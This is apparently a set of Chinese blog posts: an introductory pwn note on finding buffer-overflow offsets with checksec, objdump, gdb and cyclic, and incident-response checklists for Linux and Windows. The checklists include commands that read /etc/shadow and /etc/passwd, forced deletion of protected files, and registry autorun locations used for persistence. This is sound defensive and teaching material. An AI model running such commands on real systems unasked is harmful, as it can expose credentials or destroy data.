    <url>/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
    <content><![CDATA[<p>几天不摸，感觉又回到解放前了。</p>
<p>以后一定要多尝试学习不同的东西，保持热爱，放好心态！</p>
<p>pwn学习之路系列的第二天，开坑！</p>
<p>这里记录一下写题的一些工具使用和碎碎念</p>
<p>当你拿到题目之后……（接下来用一道入门级别的题目做栗子）</p>
<p>第一件事要做的是checksec 他可以查看保护机制，这样有理由后续做题的分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec 文件   #看开启了哪些保护机制</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/1.png"></p>
<p>虽然开启不开启我都不会写吧，但是还是要装装样子滴</p>
<span id="more"></span>

<p>然后可以用objdump看一些东西，比方说打印函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -D 文件名   #可以看到文件的全部</span><br></pre></td></tr></table></figure>

<p>用pwngdb的时候很难看到所有的东西，提前看一看还是很重要的</p>
<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -R 文件名   #可以看到打印函数</span><br></pre></td></tr></table></figure>

<p>看到打印函数是很有用的</p>
<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/3.png"></p>
<p>接下来就可以上pwngdb了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb 文件     #启动pwngdb</span><br></pre></td></tr></table></figure>

<p>一些简单的操作之前有篇文章写的有，我不额外多写了，讲点实际做题中用到的东西</p>
<p>输入一大串字符，溢出与否有回显，这个时候同学就想，那我可以一点一点的试，什么时候正好溢出了，不就可以算偏移了吗？现在有个更简单快捷的办法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic 要输入的字符的长度</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/4.png"></p>
<p>可以看到是由英文字母组成的有规律的字符串，因此最大可以设置的值为26×26×26=456976</p>
<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/5.png"></p>
<p>复制生成的字符串，在pwngdb中进行调试，当出现报错后，就可以再通过cyclic计算要偏移的字节了</p>
<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/6.png"></p>
<p>这里报的错其实指的是输入的十六进制的字符，根据指出那一段溢出，可以接着算偏移</p>
<p>为什么呢？</p>
<p>因为恰恰就是这几个字符去覆盖了main返回地址，所以可以数数这一串字符距离字符串首字母间隔了多少字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic -l 报错的4位字符</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/7.png"></p>
]]></content>
      <categories>
        <category>我的pwn学习之路</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全应急响应Linux篇</title>
    <url>/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/</url>
    <content><![CDATA[<p>这篇笔记参考了奇安信安服团队所写的书——《网络安全应急响应技术实战指南》</p>
<p>算是自己看书和学习的一个总结和整理。这里是对Linux的小总结</p>
<p>【正在更新中】</p>
<h1 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h1><h2 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h2><h3 id="cpu信息"><a href="#cpu信息" class="headerlink" title="cpu信息"></a>cpu信息</h3><p>【lscpu】命令可查看cpu相关信息，包括型号、主频、内核等</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/1.png"></p>
<h3 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/3.png"></p>
<span id="more"></span>

<h3 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/4.png"></p>
<h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><h3 id="查看系统所有用户信息"><a href="#查看系统所有用户信息" class="headerlink" title="查看系统所有用户信息"></a>查看系统所有用户信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd  </span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/5.png"></p>
<h3 id="分析超级权限账户"><a href="#分析超级权限账户" class="headerlink" title="分析超级权限账户"></a>分析超级权限账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;&#123;if($3==0)print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/6.png"></p>
<h3 id="查看可登录的账户"><a href="#查看可登录的账户" class="headerlink" title="查看可登录的账户"></a>查看可登录的账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep &#x27;/bin/bash&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/7.png"></p>
<h3 id="查看用户错误的登录信息"><a href="#查看用户错误的登录信息" class="headerlink" title="查看用户错误的登录信息"></a>查看用户错误的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastb</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/8.png"></p>
<h3 id="查看所有用户最后的登录信息"><a href="#查看所有用户最后的登录信息" class="headerlink" title="查看所有用户最后的登录信息"></a>查看所有用户最后的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastlog | more</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/9.png"></p>
<h3 id="查看用户最近登录信息"><a href="#查看用户最近登录信息" class="headerlink" title="查看用户最近登录信息"></a>查看用户最近登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/10.png"></p>
<h3 id="查看当前用户登录系统情况"><a href="#查看当前用户登录系统情况" class="headerlink" title="查看当前用户登录系统情况"></a>查看当前用户登录系统情况</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/11.png"></p>
<h3 id="查看空口令账户"><a href="#查看空口令账户" class="headerlink" title="查看空口令账户"></a>查看空口令账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>

<h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/12.jpg"></p>
<h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">crontab -u root -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/13.png"></p>
<p>这条显示的命令为腾讯云的资源监控</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/14.jpg">                                    </p>
<h1 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp | more #查看网络连接</span><br><span class="line"></span><br><span class="line">ls -alt /proc/【PID】#查看对应的可执行程序</span><br><span class="line"></span><br><span class="line">lsof -p PID #查看该进程打开的文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 PID #结束进程</span><br><span class="line"></span><br><span class="line">rm -rf filename #删除目标文件</span><br><span class="line"></span><br><span class="line">若删除不成功lsattr filename查看是否被加上i属性然后使用chattr -i filename移除i属性，在进行文件的删除</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt; 1  #查看隐藏进程123</span><br><span class="line"></span><br><span class="line">ls /proc | sort -n | uniq &gt; 2</span><br><span class="line"></span><br><span class="line">diff 1 2 #对比</span><br></pre></td></tr></table></figure>

<p>可以用top查看资源占用情况，可针对性的重点排查cpu占用率较高的进程</p>
<h1 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list  #查看系统运行的服务</span><br></pre></td></tr></table></figure>

<p>等级0表示：表示关机</p>
<p>等级1表示：单用户模式</p>
<p>等级2表示：无网络连接的多用户命令行模式</p>
<p>等级3表示：有网络连接的多用户命令行模式</p>
<p>等级4表示：不可用</p>
<p>等级5表示：带图形界面的多用户模式</p>
<p>等级6表示：重新启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service --status-all  #可查看所有服务的状态</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/15.png">        </p>
<h1 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h1><blockquote>
<p>“我不知道怎么形容，但它一直存在”</p>
</blockquote>
<hr>
]]></content>
  </entry>
  <entry>
    <title>网络安全应急响应windows篇</title>
    <url>/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/</url>
    <content><![CDATA[<p>这篇笔记参考了奇安信安服团队所写的书——《网络安全应急响应技术实战指南》</p>
<p>算是自己看书和学习的一个总结和整理。</p>
<blockquote>
<p>事件发生前未雨绸缪，事件发生后亡羊补牢。</p>
</blockquote>
<p>顺便想提一下书中在1.3中所写的一个机构、企业网络安全应急响应应具备的能力。</p>
<p> <img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/0.jpg"></p>
<p>这几个技能点稍加修改包装，简历不就又能加几行了吗（）</p>
<p>常见网络安全应急响应场景：</p>
<p>勒索病毒，挖矿木马，Webshell，网页篡改，DDoS攻击，数据泄露，流量劫持等</p>
<p>应急响应分析流程如下：</p>
<blockquote>
<p>事件类型→时间范围→系统排查→进程排查→服务排查→文件痕迹检查→日志分析→(关联推理)→结论</p>
</blockquote>
<p>下面就是对技能点的简单总结。</p>
<span id="more"></span>

<hr>
<h2 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h2><h3 id="Windows服务"><a href="#Windows服务" class="headerlink" title="Windows服务"></a>Windows服务</h3><h4 id="系统信息工具"><a href="#系统信息工具" class="headerlink" title="系统信息工具"></a>系统信息工具</h4><p>如果只是简单的了解可以通过命令行输入【systeminfo】该命令能查看主机名、操作系统版本等信息。</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/1.jpg"></p>
<p>更详细一些的内容可以通过命令行输入【winmsd】或【msinfo32】(这个是前者的更新版本)</p>
<p>例如靶机windows2003用的就是【winmsd】命令</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/2.jpg"></p>
<p>win10电脑是【msinfo32】命令</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/3.jpg"></p>
<h4 id="正在运行的任务"><a href="#正在运行的任务" class="headerlink" title="正在运行的任务"></a>正在运行的任务</h4><p>在【系统信息】窗口中，单击【软件环境】中的【正在运行任务】选项，可以查看正在运行任务的名称、状态、路径</p>
<p>进程ID等信息。</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/4.png"></p>
<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>在【系统信息】窗口中，单击【软件环境】中的【服务】选项，可以查看服务的名称、状态、路径等信息。</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/5.jpg"></p>
<h4 id="系统驱动服务"><a href="#系统驱动服务" class="headerlink" title="系统驱动服务"></a>系统驱动服务</h4><p>在【系统信息】窗口中，单击【软件环境】中的【系统驱动程序】选项，可以查看系统驱动程序的名称、描述、文件等信息。</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/6.png"></p>
<h4 id="加载的模块"><a href="#加载的模块" class="headerlink" title="加载的模块"></a>加载的模块</h4><p>在【系统信息】窗口中，单击【软件环境】中的【加载的模块】选项，可以查看加载的模块名称、路径等信息。</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/7.png"></p>
<h4 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h4><p>在【系统信息】窗口中，单击【软件环境】中的【启动程序】选项，可以查看启动程序命令、用户名、位置等信息。</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/8.png"></p>
<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>Windows系统中排查恶意账户有以下4种方法：</p>
<h4 id="1-命令行方法【无法看到隐藏账户】"><a href="#1-命令行方法【无法看到隐藏账户】" class="headerlink" title="1.命令行方法【无法看到隐藏账户】"></a>1.命令行方法【无法看到隐藏账户】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user   #查看用户（不包括隐藏用户）</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/9.png"></p>
<p>进一步收集账户信息可加上username</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/10.png"></p>
<h4 id="2-图形界面方法"><a href="#2-图形界面方法" class="headerlink" title="2.图形界面方法"></a>2.图形界面方法</h4><p>我的电脑→右键→管理→计算机管理（本地）→本地用户和组→用户</p>
<p>或者在命令行输入【lusrmgr.msc】</p>
<p>可以看到带$的隐藏账户</p>
<h4 id="3-注册表方法"><a href="#3-注册表方法" class="headerlink" title="3.注册表方法"></a>3.注册表方法</h4><p>在命令行中输入【regedit】即可打开注册表编辑器</p>
<p>选择【HKEY_LOCAL_MACHINE】下的【SAM】选项，右键点击权限界面并进入高级安全设置，更改权限然后才能看到东西，不然啥也看不到。</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/11.png"></p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/12.png"></p>
<p>双击Users文件夹可以看到对应账号F值的二进制数据（可右键导出），若发现两个账号相同 ，则发现克隆账号。</p>
<h4 id="4-wmic方法"><a href="#4-wmic方法" class="headerlink" title="4.wmic方法"></a>4.wmic方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get name,SID</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/13.png"></p>
<h3 id="Windows启动项"><a href="#Windows启动项" class="headerlink" title="Windows启动项"></a>Windows启动项</h3><blockquote>
<p>启动项是病毒后门等实现持久化驻留的一种常用方法，在应急响应中也是排查的必要项目</p>
</blockquote>
<h4 id="1-通过【系统配置】对话框查看"><a href="#1-通过【系统配置】对话框查看" class="headerlink" title="1.通过【系统配置】对话框查看"></a>1.通过【系统配置】对话框查看</h4><p>Win+R 输入【msconfig】即可</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/14.png"></p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/15.png"></p>
<h4 id="2-通过注册表查看"><a href="#2-通过注册表查看" class="headerlink" title="2.通过注册表查看"></a>2.通过注册表查看</h4><p>各个目录的含义看书吧 懒得打字了orz</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/16.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注册表放自启动项目录（不完全整理）</span><br><span class="line">Explorer/Run键：</span><br><span class="line">HKEY_LOCAL_MACHINE_SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/Run</span><br><span class="line">Userinit键：</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/WindowsNT/CurrentVersion/Winlogon/Userinit</span><br><span class="line">RunServicesOnce键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/RunServicesOnce</span><br><span class="line">RunServices键：</span><br><span class="line">KEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/ CurrentVersion/RunServices</span><br><span class="line">Run键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</span><br><span class="line">Load键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/WindowsNT/CurrentVersion/Windows/load</span><br><span class="line">RunOnce/Setup键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce/Setup</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/RunOnceEx</span><br></pre></td></tr></table></figure>

<p>添加注册表也是惯用手段了。</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/17.png"></p>
<h3 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h3><p>不详细讲了，看图就完事儿了，这个方法还是很明显的</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/17.5.png"></p>
<h3 id="Windows防火墙网络出入"><a href="#Windows防火墙网络出入" class="headerlink" title="Windows防火墙网络出入"></a>Windows防火墙网络出入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh Firewall show state   #查看系统防火墙状态</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/18.png"></p>
<p>在新版虽然已被弃用，但仍可以提供所需要的信息</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/19.png"></p>
<hr>
<h2 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h2><h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><h4 id="通过【任务管理器】查看"><a href="#通过【任务管理器】查看" class="headerlink" title="通过【任务管理器】查看"></a>通过【任务管理器】查看</h4><p>实践中我发现了各版本间有写不同，比如win10在进程格右键就能选择，而2003在【查看】选项中，win7的叫法也有所不同，不过差距都不大。Windows 2003我没有发现显示映像路径和命令行设置设置，很苦恼T T</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/20.png"></p>
<p>总之就是要看到进程名称、PID、命令行，可以初步判断哪些进程和行为可疑，方便锁定目标。</p>
<h4 id="使用【tasklist】命令进行排查"><a href="#使用【tasklist】命令进行排查" class="headerlink" title="使用【tasklist】命令进行排查"></a>使用【tasklist】命令进行排查</h4><p>和一些参数一起食用更佳</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc  #显示每个进程和服务的对应情况</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/21.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /m</span><br></pre></td></tr></table></figure>

<p>对于某些加载DLL的恶意进程可以使用</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/22.png"></p>
<p>查找特定的DLL后跟相应的进程模块即可。tasklist命令还有过滤器功能，可以结合具体情况使用</p>
<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/23.png"></p>
<p>不知道有哪些功能的可以【tasklist /?】</p>
<h4 id="使用【netstat】命令进行排查"><a href="#使用【netstat】命令进行排查" class="headerlink" title="使用【netstat】命令进行排查"></a>使用【netstat】命令进行排查</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/24.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr &quot;ESTABLISHED&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/25.png"></p>
<p>ESTABLISHED，含义TCP:连接成功</p>
<p>如果需要定位筛查具体名称的话，还可以联动tasklist</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如tasklist | find &quot;PID&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anb 可以查找发起外连的程序，不过需要管理员权限</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/25.2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process get name,parentprocessid,processid /format:csv 这样看起来就简洁一点</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/25.3.png"></p>
<h3 id="文件痕迹检查"><a href="#文件痕迹检查" class="headerlink" title="文件痕迹检查"></a>文件痕迹检查</h3><blockquote>
<p>它们告诉我，你曾经存在过。</p>
</blockquote>
<h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>各个盘下的/temp、/tmp文件夹</p>
<p>例如c:\windows\system32\inetsrv\MetaBase.<a href="https://so.csdn.net/so/search?q=xml&spm=1001.2101.3001.7020">xml</a>     #IIS配置文件</p>
<p>还有就是MySQL，PHP，Apache等等的配置文件，这里不在过多阐述和总结。</p>
<p>网上有很多现成又详细的总结，这里简单的其他博主的优秀文章。</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_50464560/article/details/119063335">https://blog.csdn.net/weixin_50464560/article/details/119063335</a></p>
<p><a href="https://blog.csdn.net/lzz710107110/article/details/122386379">https://blog.csdn.net/lzz710107110/article/details/122386379</a></p>
</blockquote>
<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p>包括但不仅限于：浏览器历史记录、下载文件、cookie信息</p>
<h4 id="查看用户Recent文件"><a href="#查看用户Recent文件" class="headerlink" title="查看用户Recent文件"></a>查看用户Recent文件</h4><p>访问过的文件夹或文件是有记录的如C:/Documents and Settings\Default User\Recent</p>
<p>C:/Documents and Settings\用户名\Recent</p>
